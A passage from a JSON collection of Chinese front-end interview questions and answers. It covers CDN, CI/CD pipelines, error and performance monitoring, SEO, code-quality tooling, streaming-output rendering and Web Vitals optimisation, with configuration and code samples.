阿里云 DCDN |\n| 下载加速 | 大文件分发 | 软件下载 |\n| 视频加速 | 流媒体分发 | 直播/点播 |\n| 安全加速 | WAF + DDoS 防护 | Cloudflare |\n\n### CDN 回源\n\n边缘节点缓存未命中时，向源站请求：\n\n```text\n边缘节点 → 源站（你的服务器/OSS）\n```\n\n**回源率**：回源请求 / 总请求。优化目标：降低回源率。\n\n### CDN 刷新/预热\n- **刷新**：主动清除缓存（发布新版本时）\n- **预热**：主动预加载资源到边缘节点（大促前）\n\n### 常见 CDN 提供商\n- **国际**：Cloudflare、AWS CloudFront、Akamai\n- **国内**：阿里云 CDN、腾讯云 CDN、七牛云"
  },
  {
    "id": "be-025",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "CI/CD",
      "自动化",
      "部署"
    ],
    "question": "前端 CI/CD 流程是怎样的？如何实现自动化部署？",
    "answer": "### CI/CD 概念\n\n- **CI**（持续集成）：代码推送后自动构建、测试\n- **CD**（持续交付/部署）：自动部署到测试/生产环境\n\n### 典型前端 CI/CD 流程\n\n```text\n代码推送 → 触发 CI → 安装依赖 → 代码检查 → 构建 → 测试 → 部署\n                                                       ↓\n                                              测试环境 / 预发布 / 生产\n```\n\n### GitHub Actions 示例\n\n```yaml\n# .github/workflows/deploy.yml\nname: Build and Deploy\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n          cache: 'npm'\n      \n      - name: Install\n        run: npm ci\n      \n      - name: Lint\n        run: npm run lint\n      \n      - name: Test\n        run: npm run test:unit\n      \n      - name: Build\n        run: npm run build\n        env:\n          VITE_API_URL: ${{ secrets.API_URL }}\n      \n      - name: Upload artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n  \n  deploy-staging:\n    needs: build\n    if: github.ref == 'refs/heads/develop'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist\n      \n      - name: Deploy to Staging\n        uses: appleboy/scp-action@v0.1.7\n        with:\n          host: ${{ secrets.STAGING_HOST }}\n          username: ${{ secrets.SSH_USER }}\n          key: ${{ secrets.SSH_KEY }}\n          source: 'dist/*'\n          target: '/var/www/staging'\n  \n  deploy-production:\n    needs: build\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    environment: production  # 需要审批\n    steps:\n      - uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist\n      \n      - name: Deploy to CDN\n        run: |\n          npx aliyun-cdn-cli deploy --path dist/\n        env:\n          CDN_KEY: ${{ secrets.CDN_KEY }}\n```\n\n### 分支策略\n\n```text\nmain      → 自动部署到生产\ndevelop   → 自动部署到预发布\nfeature/* → CI 构建+测试，不部署\nhotfix/*  → 紧急修复，直接合并 main\n```\n\n### 常用 CI/CD 工具\n\n| 工具 | 特点 |\n|------|------|\n| GitHub Actions | GitHub 集成、免费额度 |\n| GitLab CI | GitLab 集成、自托管 |\n| Jenkins | 老牌、自托管、插件多 |\n| CircleCI | 云端、速度快 |\n| Vercel | 前端友好、零配置 |\n| Netlify | 前端友好、零配置 |\n\n### Vercel 零配置部署\n\n```bash\n# 安装 CLI\nnpm i -g vercel\n\n# 部署\nvercel        # 预览环境\nvercel --prod # 生产环境\n```\n\n连接 GitHub 仓库后，推送代码自动部署。\n\n### Docker 部署\n\n```dockerfile\n# Dockerfile\nFROM node:20-alpine as build\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\nFROM nginx:alpine\nCOPY --from=build /app/dist /usr/share/nginx/html\nCOPY nginx.conf /etc/nginx/conf.d/default.conf\nEXPOSE 80\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\n```\n\n```yaml\n# docker-compose.yml\nservices:\n  web:\n    build: .\n    ports:\n      - \"80:80\"\n```\n\n### 环境变量管理\n```text\n# .env.development\nVITE_API_URL=http://localhost:3000\n\n# .env.staging\nVITE_API_URL=https://api.staging.example.com\n\n# .env.production\nVITE_API_URL=https://api.example.com\n```\n\n构建时注入：`npm run build -- --mode staging`\n\n### 最佳实践\n1. **代码推送即触发** CI\n2. **测试不通过不部署**\n3. **生产部署需要审批**（environment protection）\n4. **回滚机制**：保留历史版本，快速回滚\n5. **蓝绿部署/灰度发布**：降低风险"
  },
  {
    "id": "be-026",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "监控",
      "错误监控",
      "埋点"
    ],
    "question": "前端监控包含哪些方面？如何实现错误监控？",
    "answer": "### 前端监控三大领域\n\n1. **错误监控**：JS 错误、资源加载失败、API 错误\n2. **性能监控**：加载时间、FCP、LCP、白屏时间\n3. **行为监控**：PV/UV、点击流、用户路径\n\n### 错误监控\n\n**1. JS 运行时错误**\n```javascript\nwindow.addEventListener('error', (event) => {\n  report({\n    type: 'js_error',\n    message: event.message,\n    filename: event.filename,\n    lineno: event.lineno,\n    colno: event.colno,\n    stack: event.error?.stack,\n    timestamp: Date.now()\n  })\n}, true)\n```\n\n**2. Promise 未捕获异常**\n```javascript\nwindow.addEventListener('unhandledrejection', (event) => {\n  report({\n    type: 'promise_error',\n    reason: event.reason?.message || event.reason,\n    stack: event.reason?.stack,\n    timestamp: Date.now()\n  })\n})\n```\n\n**3. 资源加载错误**\n```javascript\nwindow.addEventListener('error', (event) => {\n  const target = event.target\n  if (target && (target.tagName === 'IMG' || target.tagName === 'SCRIPT' || target.tagName === 'LINK')) {\n    report({\n      type: 'resource_error',\n      tagName: target.tagName,\n      src: target.src || target.href,\n      timestamp: Date.now()\n    })\n  }\n}, true)  // 必须用捕获阶段\n```\n\n**4. 接口错误**\n```javascript\n// 拦截 fetch\nconst originalFetch = window.fetch\nwindow.fetch = async (...args) => {\n  const [url, options] = args\n  const startTime = Date.now()\n  try {\n    const response = await originalFetch(...args)\n    if (!response.ok) {\n      report({\n        type: 'api_error',\n        url: typeof url === 'string' ? url : url.url,\n        status: response.status,\n        duration: Date.now() - startTime\n      })\n    }\n    return response\n  } catch (error) {\n    report({\n      type: 'api_error',\n      url: typeof url === 'string' ? url : url.url,\n      error: error.message,\n      duration: Date.now() - startTime\n    })\n    throw error\n  }\n}\n\n// 拦截 XMLHttpRequest\nconst originalOpen = XMLHttpRequest.prototype.open\nconst originalSend = XMLHttpRequest.prototype.send\nXMLHttpRequest.prototype.open = function(method, url, ...args) {\n  this._url = url\n  this._method = method\n  this._startTime = Date.now()\n  originalOpen.call(this, method, url, ...args)\n}\nXMLHttpRequest.prototype.send = function(...args) {\n  this.addEventListener('loadend', () => {\n    if (this.status >= 400) {\n      report({\n        type: 'api_error',\n        url: this._url,\n        method: this._method,\n        status: this.status,\n        duration: Date.now() - this._startTime\n      })\n    }\n  })\n  originalSend.call(this, ...args)\n}\n```\n\n### 性能监控\n\n```javascript\n// Web Vitals\nimport { onCLS, onFID, onLCP, onFCP, onTTFB } from 'web-vitals'\n\nonCLS(console.log)   // 累积布局偏移\nonFID(console.log)   // 首次输入延迟\nonLCP(console.log)   // 最大内容绘制\nonFCP(console.log)   // 首次内容绘制\nonTTFB(console.log)  // 首字节时间\n\n// Performance API\nconst timing = performance.getEntriesByType('navigation')[0]\nconsole.log({\n  dns: timing.domainLookupEnd - timing.domainLookupStart,\n  tcp: timing.connectEnd - timing.connectStart,\n  ttfb: timing.responseStart - timing.requestStart,\n  domReady: timing.domComplete - timing.domLoading,\n  load: timing.loadEventEnd - timing.fetchStart\n})\n```\n\n### 上报方案\n\n```javascript\nfunction report(data) {\n  data.userAgent = navigator.userAgent\n  data.url = location.href\n  data.userId = getUserId()\n  \n  // 方案 1：sendBeacon（推荐，页面卸载时也能发送）\n  if (navigator.sendBeacon) {\n    const blob = new Blob([JSON.stringify(data)], { type: 'application/json' })\n    navigator.sendBeacon('/api/monitor', blob)\n    return\n  }\n  \n  // 方案 2：fetch keepalive\n  fetch('/api/monitor', {\n    method: 'POST',\n    body: JSON.stringify(data),\n    keepalive: true\n  })\n  \n  // 方案 3：Image（简单但只支持 GET）\n  new Image().src = `/api/monitor?data=${encodeURIComponent(JSON.stringify(data))}`\n}\n```\n\n### Source Map 还原\n\n生产环境代码经过压缩混淆，错误堆栈不可读：\n```javascript\n// 服务器端使用 source-map 库还原\nconst sourceMap = require('source-map')\nconst fs = require('fs')\n\nasync function还原(line, column) {\n  const rawSourceMap = JSON.parse(fs.readFileSync('app.js.map', 'utf8'))\n  const consumer = await new sourceMap.SourceMapConsumer(rawSourceMap)\n  const original = consumer.originalPositionFor({ line, column })\n  console.log(original.source, original.line, original.name)\n}\n```\n\n### 常用监控工具\n\n| 工具 | 特点 |\n|------|------|\n| Sentry | 错误监控、Source Map |\n| LogRocket | 录屏回放 |\n| Google Analytics | 行为分析 |\n| 阿里云 ARMS | 全链路监控 |\n| Datadog | 全栈监控 |\n\n### 监控指标\n- **错误率**：错误数 / PV\n- **API 成功率**：成功请求 / 总请求\n- **平均响应时间**\n- **白屏时间**\n- **核心 Web Vitals**"
  },
  {
    "id": "be-027",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "SEO",
      "搜索引擎",
      "元数据"
    ],
    "question": "前端如何做 SEO 优化？",
    "answer": "### SEO 核心原则\n\n1. **可爬取**：搜索引擎能访问页面内容\n2. **可索引**：页面能被搜索引擎收录\n3. **内容相关**：页面内容与搜索关键词匹配\n4. **性能好**：加载速度影响排名\n\n### 技术优化\n\n**1. 语义化 HTML**\n```html\n<!-- ✅ 语义化标签 -->\n<header>\n  <nav>导航</nav>\n</header>\n<main>\n  <article>\n    <h1>标题</h1>\n    <p>内容</p>\n  </article>\n  <aside>侧边栏</aside>\n</main>\n<footer>页脚</footer>\n\n<!-- ❌ 全 div -->\n<div class=\"header\">\n  <div class=\"nav\">导航</div>\n</div>\n```\n\n**2. Meta 标签**\n```html\n<head>\n  <title>页面标题 - 品牌（60字符以内）</title>\n  <meta name=\"description\" content=\"页面描述（160字符以内）\">\n  <meta name=\"keywords\" content=\"关键词1, 关键词2\">\n  <link rel=\"canonical\" href=\"https://example.com/page\">\n  \n  <!-- Open Graph（社交媒体分享）-->\n  <meta property=\"og:title\" content=\"标题\">\n  <meta property=\"og:description\" content=\"描述\">\n  <meta property=\"og:image\" content=\"https://example.com/image.jpg\">\n  <meta property=\"og:url\" content=\"https://example.com/page\">\n</head>\n```\n\n**3. SSR/SSG（关键！）**\n\n```javascript\n// CSR（客户端渲染）→ SEO 差\n// 搜索引擎可能不执行 JS，看到空页面\n\n// SSR（服务端渲染）→ SEO 好\n// 服务器返回完整 HTML\n\n// SSG（静态生成）→ SEO 好\n// 构建时生成 HTML\n\n// Next.js / Nuxt.js 提供 SSR/SSG\n```\n\n**4. 结构化数据（Schema.org）**\n```html\n<script type=\"application/ld+json\">\n{\n  \"@context\": \"https://schema.org\",\n  \"@type\": \"Article\",\n  \"headline\": \"文章标题\",\n  \"author\": { \"@type\": \"Person\", \"name\": \"作者\" },\n  \"datePublished\": \"2024-01-01\",\n  \"image\": \"https://example.com/image.jpg\"\n}\n</script>\n```\n\n**5. sitemap.xml 和 robots.txt**\n```xml\n<!-- sitemap.xml -->\n<urlset>\n  <url>\n    <loc>https://example.com/page1</loc>\n    <lastmod>2024-01-01</lastmod>\n    <changefreq>weekly</changefreq>\n    <priority>0.8</priority>\n  </url>\n</urlset>\n```\n\n```text\n# robots.txt\nUser-agent: *\nAllow: /\nDisallow: /admin/\nSitemap: https://example.com/sitemap.xml\n```\n\n**6. 性能优化**\n- Core Web Vitals 达标（LCP < 2.5s, FID < 100ms, CLS < 0.1）\n- 图片懒加载 + WebP\n- 预渲染关键路径\n\n### 内容优化\n\n```html\n<!-- 标题层级 -->\n<h1>主标题（每页一个）</h1>\n<h2>次标题</h2>\n<h3>三级标题</h3>\n\n<!-- 图片 alt -->\n<img src=\"cat.jpg\" alt=\"一只橘猫在晒太阳\">\n\n<!-- 链接描述 -->\n<a href=\"/about\">关于我们</a>  <!-- ✅ -->\n<a href=\"/about\">点击这里</a>   <!-- ❌ -->\n\n<!-- 面包屑导航 -->\n<nav>\n  <a href=\"/\">首页</a> > <a href=\"/blog\">博客</a> > <span>文章标题</span>\n</nav>\n```\n\n### SPA SEO 挑战\n\n```javascript\n// SPA（CSR）的问题：\n// 1. 初始 HTML 为空（只有一个 <div id=\"app\"></div>）\n// 2. 路由切换不改变 URL（需要 History API）\n// 3. 搜索引擎可能不执行 JS\n\n// 解决方案：\n// 1. 使用 SSR（Next.js / Nuxt.js）\n// 2. 预渲染（prerender-spa-plugin）\n// 3. 动态渲染（检测爬虫 UA 返回 SSR 内容）\n```\n\n### SEO 检查清单\n- [ ] 使用 SSR/SSG\n- [ ] 每页有唯一的 title 和 description\n- [ ] 语义化 HTML\n- [ ] 图片有 alt 属性\n- [ ] 有 sitemap.xml\n- [ ] 有 robots.txt\n- [ ] 使用 HTTPS\n- [ ] 移动端适配\n- [ ] Core Web Vitals 达标\n- [ ] 结构化数据标记\n- [ ] 内部链接合理\n- [ ] 规范化 URL（canonical）"
  },
  {
    "id": "be-029",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "代码质量",
      "ESLint",
      "Prettier",
      "测试"
    ],
    "question": "前端代码质量保障有哪些手段？ESLint、Prettier、测试如何配置？",
    "answer": "### ESLint\n\n```javascript\n// eslint.config.js（Flat Config，ESLint 9+）\nimport js from '@eslint/js'\nimport vue from 'eslint-plugin-vue'\nimport tsParser from '@typescript-eslint/parser'\n\nexport default [\n  js.configs.recommended,\n  ...vue.configs['flat/recommended'],\n  {\n    files: ['**/*.{js,ts,vue}'],\n    languageOptions: {\n      parser: tsParser,\n    },\n    rules: {\n      'no-unused-vars': 'error',\n      'no-console': 'warn',\n      'prefer-const': 'error',\n      'vue/multi-word-component-names': 'off'\n    }\n  }\n]\n```\n\n**常用规则：**\n- `no-unused-vars`：未使用变量\n- `no-console`：禁用 console\n- `eqeqeq`：必须用 ===\n- `prefer-const`：优先 const\n- `no-var`：禁用 var\n\n### Prettier\n\n```json\n// .prettierrc\n{\n  \"semi\": false,\n  \"singleQuote\": true,\n  \"tabWidth\": 2,\n  \"trailingComma\": \"none\",\n  \"printWidth\": 100,\n  \"arrowParens\": \"avoid\"\n}\n```\n\n**ESLint + Prettier 集成：**\n```bash\nnpm install -D eslint-config-prettier\n```\n```javascript\n// 关闭与 Prettier 冲突的 ESLint 规则\nexport default [\n  ...otherConfigs,\n  'prettier'  // 放在最后\n]\n```\n\n### Git Hooks（Husky + lint-staged）\n\n```bash\nnpm install -D husky lint-staged\nnpx husky init\n```\n\n```json\n// package.json\n{\n  \"lint-staged\": {\n    \"*.{js,ts,vue}\": [\"eslint --fix\", \"prettier --write\"],\n    \"*.{css,scss,json,md}\": [\"prettier --write\"]\n  }\n}\n```\n\n```bash\n# .husky/pre-commit\nnpx lint-staged\n```\n\n### commitlint（提交规范）\n\n```bash\nnpm install -D @commitlint/cli @commitlint/config-conventional\n```\n\n```javascript\n// commitlint.config.js\nexport default {\n  extends: ['@commitlint/config-conventional'],\n  rules: {\n    'type-enum': [2, 'always', [\n      'feat', 'fix', 'docs', 'style', 'refactor',\n      'perf', 'test', 'build', 'ci', 'chore', 'revert'\n    ]]\n  }\n}\n```\n\n```bash\n# .husky/commit-msg\nnpx --no-install commitlint --edit $1\n```\n\n提交格式：`feat: 添加用户登录功能`\n\n### 测试\n\n**单元测试（Vitest）：**\n```javascript\n// sum.test.js\nimport { describe, it, expect } from 'vitest'\nimport { sum } from './sum'\n\ndescribe('sum', () => {\n  it('should add two numbers', () => {\n    expect(sum(1, 2)).toBe(3)\n  })\n  \n  it('should handle negative numbers', () => {\n    expect(sum(-1, -2)).toBe(-3)\n  })\n})\n```\n\n**组件测试（Testing Library）：**\n```javascript\nimport { render, screen, fireEvent } from '@testing-library/vue'\nimport Counter from './Counter.vue'\n\ntest('increments on click', async () => {\n  render(Counter)\n  await fireEvent.click(screen.getByText('Count: 0'))\n  expect(screen.getByText('Count: 1')).toBeTruthy()\n})\n```\n\n**E2E 测试（Playwright）：**\n```javascript\nimport { test, expect } from '@playwright/test'\n\ntest('login flow', async ({ page }) => {\n  await page.goto('/login')\n  await page.fill('[data-testid=email]', 'user@test.com')\n  await page.fill('[data-testid=password]', 'password')\n  await page.click('[data-testid=submit]')\n  await expect(page).toHaveURL('/dashboard')\n})\n```\n\n### 代码质量工具汇总\n\n| 工具 | 作用 |\n|------|------|\n| ESLint | 代码规范检查 |\n| Prettier | 代码格式化 |\n| Husky | Git Hooks |\n| lint-staged | 只检查暂存文件 |\n| commitlint | 提交信息规范 |\n| Vitest/Jest | 单元测试 |\n| Testing Library | 组件测试 |\n| Playwright/Cypress | E2E 测试 |\n| TypeScript | 类型检查 |\n| SonarQube | 代码质量扫描 |"
  },
  {
    "id": "be-031",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "hard",
    "tags": [
      "SSE",
      "ReadableStream",
      "流式",
      "内存",
      "性能"
    ],
    "question": "前端通过 SSE / ReadableStream 接收大模型流式输出时，UI 渲染慢、内存容易暴涨，应该如何优化？",
    "answer": "流式场景（如 AI 对话）的核心是「**边读边处理，不 accumulate 全量**」。\n\n### 1. 用 ReadableStream 逐块消费，而不是等全部读完\n\n```javascript\nconst res = await fetch('/api/stream')\nconst reader = res.body.getReader()\nconst decoder = new TextDecoder()\n\nwhile (true) {\n  const { done, value } = await reader.read()\n  if (done) break\n  const chunk = decoder.decode(value, { stream: true })\n  appendToUI(chunk)        // 逐块追加，不保存全量字符串\n}\n```\n\n### 2. 避免内存暴涨的关键点\n- **不要拼接整个响应**：用 `array.push(chunk)` 后立刻渲染，或干脆不缓存，只在 UI 上累加（必要时只保留最终结果）。\n- **批量更新 UI**：高频小块直接操作 DOM 会卡顿，用 `requestAnimationFrame` 或节流合并多次更新（每帧只重绘一次）。\n- **SSE** 用原生 EventSource / 或 fetch + ReadableStream，监听 `onmessage` 逐条处理。\n- **解码器复用**：`TextDecoder` 复用同一个实例，避免每片 new。\n\n### 3. 多 Session / 切换标签页的状态隔离\n- 用「草稿(draft) / 生成中(generating)」状态机管理，每个会话独立保存流式内容。\n- 切走标签页时 rAF 暂停，回来再续；用 `visibilitychange` 控制是否继续追加渲染。\n\n### 4. 内存泄漏排查\n- 流式回调里引用的组件若已卸载，要取消 reader（`reader.cancel()`）并解绑监听。\n- 长对话注意只保留必要上下文，旧消息可裁剪或摘要压缩。\n\n> 一句话：**流式渲染 = 增量消费 + 合并更新 + 及时释放**，不要等「全部到齐」再处理。"
  },
  {
    "id": "be-032",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "hard",
    "tags": [
      "性能优化",
      "首屏",
      "TTFB",
      "全链路",
      "流式"
    ],
    "question": "一个页面首字符响应要 5 秒，如何把它优化到 200ms 以内？给出全链路优化思路。",
    "answer": "将页面 TTFB（Time to First Byte，首字节响应时间）从 **5,000ms 压降到 200ms 以内**，必须沿着 **“DNS 与连接建立 → CDN 边缘缓存 → 服务端并发聚合 → 流式渲染传输（Streaming）”** 进行全链路治理。\n\n### 一、 全链路四层压降矩阵（5s → <200ms）\n\n| 链路层级 | 常见 5s 慢响应根因 | 优化手段与工程落地指标 | 预期耗时变化 |\n| :--- | :--- | :--- | :--- |\n| **1. 网络连接层** | TLS 1.2 多次握手、HTTP/1.1 队头阻塞 | 开启 **HTTP/3 (QUIC)** + TLS 1.3 + `preconnect` 预连接 | 500ms → **30ms** |\n| **2. CDN 边缘层** | 每次 HTML 请求直接穿透回源站动态计算 | 配置 **Edge SSR + Stale-While-Revalidate**（`s-maxage=60, stale-while-revalidate=86400`） | 3,000ms → **25ms** |\n| **3. 服务端数据层** | SSR 内部串行等待 5～8 个后端接口或慢查询 | 串行改 **`Promise.all` 并行拉取** + Redis 热点缓存 + 非首屏数据下放客户端 | 4,000ms → **100ms** |\n| **4. 流式传输层** | 传统 `renderToString` 等整页拼完才发首字节 | 切换 **Streaming SSR（`renderToPipeableStream`）**，先冲刷 `<head>` 与首屏外壳 | 首字节降至 **<50ms** |\n\n### 二、 诊断采集与流式 SSR 代码落地\n\n```javascript\n// 1. 浏览器端精确拆解 TTFB 各阶段耗时\nconst [nav] = performance.getEntriesByType('navigation')\nconsole.table({\n  dns: Math.round(nav.domainLookupEnd - nav.domainLookupStart),\n  tcpAndTls: Math.round(nav.connectEnd - nav.connectStart),\n  serverWaiting: Math.round(nav.responseStart - nav.requestStart),\n})\n\n// 2. Node.js 端使用 React Streaming SSR 立即冲刷首字节\nimport { renderToPipeableStream } from 'react-dom/server'\n\napp.get('/post/:id', (req, res) => {\n  res.setHeader('Content-Type', 'text/html; charset=utf-8')\n  res.setHeader('Cache-Control', 'public, s-maxage=60, stale-while-revalidate=3600')\n  const { pipe } = renderToPipeableStream(<App postId={req.params.id} />, {\n    onShellReady() {\n      res.statusCode = 200\n      pipe(res) // 外壳就绪即刻发送首字节（TTFB < 50ms），慢组件由 Suspense 流式补齐\n    }\n  })\n})\n```"
  },
  {
    "id": "be-033",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "FCP",
      "LCP",
      "Web Vitals",
      "性能",
      "监控"
    ],
    "question": "FCP 和 LCP 有什么区别和关系？各自如何优化？",
    "answer": "**FCP（First Contentful Paint，首次内容绘制）** 与 **LCP（Largest Contentful Paint，最大内容绘制）** 是衡量 Web 首屏加载体验的两个核心指标，其中 LCP 是 Google Core Web Vitals 三大核心体验指标之一。\n\n### 一、 FCP 与 LCP 核心对比表\n\n| 维度 | FCP（首次内容绘制） | LCP（最大内容绘制） |\n| :--- | :--- | :--- |\n| **测量定义** | 从导航开始到**首个 DOM 内容（文字、图片、SVG）**首次绘制到屏幕的时间 | 从导航开始到**视口内面积最大的主内容元素（Hero 大图或主标题块）**完成渲染的时间 |\n| **用户体验含义** | 反映“页面有没有反应（何时结束白屏）” | 反映“页面主要内容什么时候真正可读可用” |\n| **Google 优秀标准** | **≤ 1.8 秒**（> 3.0s 为差） | **≤ 2.5 秒**（> 4.0s 为差） |\n\n### 二、 Google 官方 LCP 四子阶段拆解与优化代码\n\nGoogle 将 LCP 耗时拆解为四个互斥阶段：**TTFB（首字节时间）+ Resource Load Delay（资源发现延迟）+ Resource Load Duration（资源下载耗时）+ Element Render Delay（元素渲染延迟）**。\n\n```html\n<!-- 1. 消除资源发现延迟：在 HTML <head> 中使用 preload + fetchpriority=\"high\" 提前加载首屏大图 -->\n<link rel=\"preload\" as=\"image\" href=\"/hero-banner.avif\" fetchpriority=\"high\" />\n\n<!-- 2. 首屏 LCP 大图严禁设置 loading=\"lazy\"，并显式声明 width/height 防止 CLS 布局偏移 -->\n<img\n  src=\"/hero-banner.avif\"\n  alt=\"核心课程封面\"\n  width=\"1200\"\n  height=\"630\"\n  fetchpriority=\"high\"\n  decoding=\"async\"\n/>\n```\n\n```javascript\n// 3. 使用 PerformanceObserver 在生产环境实时监控 FCP 与 LCP\nnew PerformanceObserver((list) => {\n  for (const entry of list.getEntries()) {\n    console.log('[CWV] LCP 候选元素更新:', Math.round(entry.startTime), 'ms', entry.element)\n  }\n}).observe({ type: 'largest-contentful-paint', buffered: true })\n```"
  }
]
